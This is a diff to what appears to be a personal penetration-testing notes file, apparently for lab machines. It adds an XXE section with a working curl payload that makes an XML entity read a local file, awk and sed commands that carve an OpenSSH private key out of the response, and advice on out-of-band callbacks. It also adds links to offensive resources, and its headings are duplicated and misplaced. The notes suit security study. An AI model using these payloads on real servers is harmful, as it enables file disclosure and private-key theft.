@@ -198,4 +198,34 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
 ---
 
 ## **Outstanding**
+The previous outstanding item was the WordPress `admin-ajax.php` SQL injection breakdown. Add it here under a new WordPress subsection when the source walkthrough is available, then link it from [[COMMAND APPENDIX/Web Applications]] and [[DECISION TREE/Web Applications (Decision Tree)]].
+
+## XXE: reflected XML field and multiline key extraction
+
+The reliable sequence is baseline, harmless entity, safe file, then high-value file. The XML parser must resolve external entities, and `&xxe;` must be placed in the element the application reflects. Windows paths use `file:///C:/...`. Save the response and extract PEM markers with `awk` and `sed`; terminal wrapping can look like a broken key without changing the file itself.
+
+```bash
+curl -s -b "$CookieFile" -H 'Content-Type: text/xml' \
+  --data-raw '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><order><quantity>1</quantity><item>&xxe;</item><address>test</address></order>' \
+  "http://$BoxIP:$WebPort/process.php"
+awk '/BEGIN OPENSSH PRIVATE KEY/,/END OPENSSH PRIVATE KEY/' "$ResponseFile" \
+  | sed -e 's/^.*\(-----BEGIN OPENSSH PRIVATE KEY-----\)/\1/' \
+        -e 's/\(-----END OPENSSH PRIVATE KEY-----\).*/\1/' > "$KeyFile"
+ssh-keygen -y -f "$KeyFile"
+```
+
+If the harmless entity resolves but the file does not, check the path and the web process's read permissions. If no field reflects output, move to an external DTD and watch the attacker HTTP server for a callback.
+
+## External Resources
+
+- [HackTricks - XXE](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)
+- [PayloadsAllTheThings - XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
+- [PortSwigger - XXE](https://portswigger.net/web-security/xxe)
 - [ ] WordPress `admin-ajax.php` unauthenticated SQLi routing (why every plugin action shares one endpoint), phpass hash format.
+## External Resources
+
+- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
+- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
+- [RevShells](https://www.revshells.com/) for payload troubleshooting
+- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
+- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
